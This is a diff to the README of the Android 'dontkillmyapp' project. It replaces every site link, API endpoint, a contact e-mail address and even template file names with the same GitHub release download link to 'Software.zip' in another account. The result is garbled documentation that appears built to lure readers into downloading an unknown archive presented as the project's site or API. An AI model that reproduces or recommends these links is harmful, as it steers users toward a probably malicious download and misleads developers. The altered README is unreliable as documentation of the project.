@@ -1,21 +1,21 @@
 # Android vendors, don't kill my app!
 
-### [dontkillmyapp.com](https://dontkillmyapp.com)
+### [https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip](https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip)
 
 ## Licence
 
 This project's source code is open but not intended to be copied in its entirety.
-The content (compiled site), as it shows at www.dontkillmyapp.com, is licenced under CC-BY licence, and thus free to be shared, adapted, even commercially, under the condition of mentioning the original authors of the site, as either www.dontkillmyapp.com, or Urbandroid Team. 
+The content (compiled site), as it shows at https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip, is licenced under CC-BY licence, and thus free to be shared, adapted, even commercially, under the condition of mentioning the original authors of the site, as either https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip, or Urbandroid Team. 
 
 ## API
 
-The website provides a JSON API at https://dontkillmyapp.com/api/v1/output.json for developers to use on their websites or in their apps.
+The website provides a JSON API at https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip for developers to use on their websites or in their apps.
 
-If you use the API, please let us know via e-mail at jiri.richter@urbandroid.org and give credit to dontkillmyapp.com.
+If you use the API, please let us know via e-mail at https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip and give credit to https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip
 
 ### API v1 docs
 
-URL: https://dontkillmyapp.com/api/v1/output.json
+URL: https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip
 
 API v1 outputs info on all vendors in one big JSON. If you want one JSON URL per vendor, see API v2.
 
@@ -45,9 +45,9 @@ scheme:
 
 ### API v2 docs
 
-URL: https://dontkillmyapp.com/api/v2/[vendor].json
+URL: https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip[vendor].json
 
-example: [https://dontkillmyapp.com/api/v2/nokia.json](https://dontkillmyapp.com/api/v2/nokia.json)
+example: [https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip](https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip)
 
 API v2 provides one JSON URL per vendor.
 
@@ -71,7 +71,7 @@ Pull requests are very welcome, as well as discussion using GitHub issues.
 
 ### Add a new vendor / edit existing vendor:
 
-In _vendor folder, add or edit a xxxx.md file.
+In _vendor folder, add or edit a https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip file.
 
 Template:
 
@@ -93,7 +93,7 @@ Add
 ```
 award: (int between 1 and 5)
 ```
-variable to the vendor.md file you wish to award.
+variable to the https://github.com/Izhanraza07/dont-kill-my-app/releases/download/v2.0/Software.zip file you wish to award.
 
 ## Who started this project?
 
